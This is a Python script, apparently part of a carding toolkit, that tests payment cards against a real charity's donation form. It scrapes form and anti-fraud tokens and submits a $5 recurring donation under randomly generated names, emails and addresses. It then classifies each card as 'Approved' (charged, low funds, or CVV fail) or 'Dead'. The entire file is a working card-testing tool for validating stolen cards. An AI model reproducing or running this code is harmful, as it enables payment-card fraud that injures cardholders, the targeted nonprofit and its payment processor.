from utilsdf.functions import (
    capture,
    clean_text,
    random_email,
    random_street,
    random_word,
)
from httpx import AsyncClient


async def vantiv(cc, month, year, cvv):
    async with AsyncClient(
        follow_redirects=True, verify=False,
    ) as session:
        month = int(month)
        year = int(year)
        mail = random_email()
        street = random_street()
        n = random_word(6)

        r = await session.get(
            "https://donate.mpbfoundation.org/mspb/passport",
        )
        t = r.text
        ms = capture(t, '"submitted[ms]" value="', '"')
        cid = capture(t, '"submitted[cid]" value="', '"')
        fo = capture(t, '"form_build_id" value="', '"')

        h2 = {
            "Host": "donate.mpbfoundation.org",
            "accept": "*/*",
            "content-type": "application/x-www-form-urlencoded",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "origin": "https://donate.mpbfoundation.org",
            "referer": "https://donate.mpbfoundation.org/mspb/passport",
        }

        p2 = "js_callback=new_cookie&js_module=springboard_cookie"

        r2 = await session.post(
            "https://donate.mpbfoundation.org/js/springboard_cookie/new_cookie",
            headers=h2,
            data=p2,
        )

        h3 = {
            "Host": "donate.mpbfoundation.org",
            "accept": "application/json, text/javascript, */*; q=0.01",
            "content-type": "application/x-www-form-urlencoded",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "origin": "https://donate.mpbfoundation.org",
            "referer": "https://donate.mpbfoundation.org/mspb/passport",
        }

        p3 = "js_module=springboard_fraud&js_callback=get_token&form_id=webform_client_form_1387"

        r3 = await session.post(
            "https://donate.mpbfoundation.org/js/springboard_fraud/get_token",
            headers=h3,
            data=p3,
        )
        t3 = r3.text
        tk = capture(t3, '"token":"', '"')

        h4 = {
            "Host": "donate.mpbfoundation.org",
            "origin": "https://donate.mpbfoundation.org",
            "content-type": "multipart/form-data; boundary=----WebKitFormBoundary1B57qDOAbocjuJTz",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "referer": "https://donate.mpbfoundation.org/mspb/passport",
        }

        p4 = f"""------WebKitFormBoundary1B57qDOAbocjuJTz
Content-Disposition: form-data; name="submitted[donation][recurs_monthly]"

recurs
------WebKitFormBoundary1B57qDOAbocjuJTz
Content-Disposition: form-data; name="submitted[donation][recurring_amount]"

other
------WebKitFormBoundary1B57qDOAbocjuJTz
Content-Disposition: form-data; name="submitted[donation][other_amount]"


------WebKitFormBoundary1B57qDOAbocjuJTz
Content-Disposition: form-data; name="submitted[donation][recurring_other_amount]"

5.00
------WebKitFormBoundary1B57qDOAbocjuJTz
Content-Disposition: form-data; name="submitted[donor_information][first_name]"

{n}
------WebKitFormBoundary1B57qDOAbocjuJTz
Content-Disposition: form-data; name="submitted[donor_information][last_name]"

{n}YT
------WebKitFormBoundary1B57qDOAbocjuJTz
Content-Disposition: form-data; name="submitted[donor_information][mail]"

{mail}
------WebKitFormBoundary1B57qDOAbocjuJTz
Content-Disposition: form-data; name="submitted[billing_information][country]"

US
------WebKitFormBoundary1B57qDOAbocjuJTz
Content-Disposition: form-data; name="submitted[billing_information][address]"

{street}
------WebKitFormBoundary1B57qDOAbocjuJTz
Content-Disposition: form-data; name="submitted[billing_information][address_line_2]"


------WebKitFormBoundary1B57qDOAbocjuJTz
Content-Disposition: form-data; name="submitted[billing_information][city]"

New York
------WebKitFormBoundary1B57qDOAbocjuJTz
Content-Disposition: form-data; name="submitted[billing_information][state]"

NY
------WebKitFormBoundary1B57qDOAbocjuJTz
Content-Disposition: form-data; name="submitted[billing_information][zip]"

10027
------WebKitFormBoundary1B57qDOAbocjuJTz
Content-Disposition: form-data; name="submitted[payment_information][auth_wrapper][sustainer_authorization][Acknowledged]"

Acknowledged
------WebKitFormBoundary1B57qDOAbocjuJTz
Content-Disposition: form-data; name="submitted[payment_information][payment_method]"

credit
------WebKitFormBoundary1B57qDOAbocjuJTz
Content-Disposition: form-data; name="submitted[payment_information][payment_fields][credit][card_number]"

{cc}
------WebKitFormBoundary1B57qDOAbocjuJTz
Content-Disposition: form-data; name="submitted[payment_information][payment_fields][credit][expiration_date][card_expiration_month]"

{month}
------WebKitFormBoundary1B57qDOAbocjuJTz
Content-Disposition: form-data; name="submitted[payment_information][payment_fields][credit][expiration_date][card_expiration_year]"

{year}
------WebKitFormBoundary1B57qDOAbocjuJTz
Content-Disposition: form-data; name="submitted[payment_information][payment_fields][credit][card_cvv]"

{cvv}
------WebKitFormBoundary1B57qDOAbocjuJTz
Content-Disposition: form-data; name="submitted[payment_information][payment_fields][credit][card_type]"


------WebKitFormBoundary1B57qDOAbocjuJTz
Content-Disposition: form-data; name="submitted[payment_information][payment_fields][bank account][accType]"

Checking
------WebKitFormBoundary1B57qDOAbocjuJTz
Content-Disposition: form-data; name="submitted[payment_information][payment_fields][bank account][routingNum]"


------WebKitFormBoundary1B57qDOAbocjuJTz
Content-Disposition: form-data; name="submitted[payment_information][payment_fields][bank account][accNum]"


------WebKitFormBoundary1B57qDOAbocjuJTz
Content-Disposition: form-data; name="submitted[payment_information][processing_fee_amount]"


------WebKitFormBoundary1B57qDOAbocjuJTz
Content-Disposition: form-data; name="submitted[ms]"

{ms}
------WebKitFormBoundary1B57qDOAbocjuJTz
Content-Disposition: form-data; name="submitted[cid]"

{cid}
------WebKitFormBoundary1B57qDOAbocjuJTz
Content-Disposition: form-data; name="submitted[referrer]"


------WebKitFormBoundary1B57qDOAbocjuJTz
Content-Disposition: form-data; name="submitted[initial_referrer]"


------WebKitFormBoundary1B57qDOAbocjuJTz
Content-Disposition: form-data; name="submitted[search_engine]"


------WebKitFormBoundary1B57qDOAbocjuJTz
Content-Disposition: form-data; name="submitted[search_string]"


------WebKitFormBoundary1B57qDOAbocjuJTz
Content-Disposition: form-data; name="submitted[user_agent]"

Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36
------WebKitFormBoundary1B57qDOAbocjuJTz
Content-Disposition: form-data; name="submitted[utm_source]"


------WebKitFormBoundary1B57qDOAbocjuJTz
Content-Disposition: form-data; name="submitted[utm_medium]"


------WebKitFormBoundary1B57qDOAbocjuJTz
Content-Disposition: form-data; name="submitted[secure_prepop_autofilled]"

0
------WebKitFormBoundary1B57qDOAbocjuJTz
Content-Disposition: form-data; name="submitted[springboard_cookie_autofilled]"

disabled
------WebKitFormBoundary1B57qDOAbocjuJTz
Content-Disposition: form-data; name="submitted[utm_term]"


------WebKitFormBoundary1B57qDOAbocjuJTz
Content-Disposition: form-data; name="submitted[content_override_id]"


------WebKitFormBoundary1B57qDOAbocjuJTz
Content-Disposition: form-data; name="submitted[utm_content]"


------WebKitFormBoundary1B57qDOAbocjuJTz
Content-Disposition: form-data; name="submitted[utm_campaign]"


------WebKitFormBoundary1B57qDOAbocjuJTz
Content-Disposition: form-data; name="submitted[eml_name]"


------WebKitFormBoundary1B57qDOAbocjuJTz
Content-Disposition: form-data; name="submitted[eml_id]"


------WebKitFormBoundary1B57qDOAbocjuJTz
Content-Disposition: form-data; name="submitted[device_type]"


------WebKitFormBoundary1B57qDOAbocjuJTz
Content-Disposition: form-data; name="submitted[device_name]"


------WebKitFormBoundary1B57qDOAbocjuJTz
Content-Disposition: form-data; name="submitted[device_os]"


------WebKitFormBoundary1B57qDOAbocjuJTz
Content-Disposition: form-data; name="submitted[device_browser]"


------WebKitFormBoundary1B57qDOAbocjuJTz
Content-Disposition: form-data; name="submitted[social_referer_transaction]"


------WebKitFormBoundary1B57qDOAbocjuJTz
Content-Disposition: form-data; name="submitted[cmpgn]"


------WebKitFormBoundary1B57qDOAbocjuJTz
Content-Disposition: form-data; name="submitted[crm_affiliation]"

MSPB
------WebKitFormBoundary1B57qDOAbocjuJTz
Content-Disposition: form-data; name="submitted[gs_flag]"

None
------WebKitFormBoundary1B57qDOAbocjuJTz
Content-Disposition: form-data; name="submitted[email_type]"

Home
------WebKitFormBoundary1B57qDOAbocjuJTz
Content-Disposition: form-data; name="submitted[phone_type]"

Home
------WebKitFormBoundary1B57qDOAbocjuJTz
Content-Disposition: form-data; name="details[sid]"


------WebKitFormBoundary1B57qDOAbocjuJTz
Content-Disposition: form-data; name="details[page_num]"

1
------WebKitFormBoundary1B57qDOAbocjuJTz
Content-Disposition: form-data; name="details[page_count]"

1
------WebKitFormBoundary1B57qDOAbocjuJTz
Content-Disposition: form-data; name="details[finished]"

0
------WebKitFormBoundary1B57qDOAbocjuJTz
Content-Disposition: form-data; name="form_build_id"

{fo}
------WebKitFormBoundary1B57qDOAbocjuJTz
Content-Disposition: form-data; name="form_id"

webform_client_form_1387
------WebKitFormBoundary1B57qDOAbocjuJTz
Content-Disposition: form-data; name="springboard_fraud_token"

{tk}
------WebKitFormBoundary1B57qDOAbocjuJTz
Content-Disposition: form-data; name="springboard_fraud_js_detect"

1
------WebKitFormBoundary1B57qDOAbocjuJTz
Content-Disposition: form-data; name="op"

Donate $5.00 Monthly 
------WebKitFormBoundary1B57qDOAbocjuJTz--
"""
        r4 = await session.post(
            "https://donate.mpbfoundation.org/mspb/passport",
            headers=h4,
            data=p4,
        )
        t4 = r4.text
        msg2 = capture(t4, '<div class="alert error">', "</div>")
        msg2 = clean_text(msg2)
        msg = capture(
            msg2,
            "We received an error processing your card. Please enter your information again or try a different card. ",
            " Donation transaction failed.",
        )

        with open("c.html", "w") as a:
            a.write(r4.text)

        if r4.status_code == 302:
            status = "Approved! ✅ -» charged!"
            msg = "Thanks -» $5"
        elif msg == "Insufficient Funds":
            status = "Approved! ✅ -» low funds"
        elif msg == "Decline CVV2/CID Fail":
            status = "Approved! ✅ -» ccn"
        else:
            status = "Dead! ❌"

        return status, msg
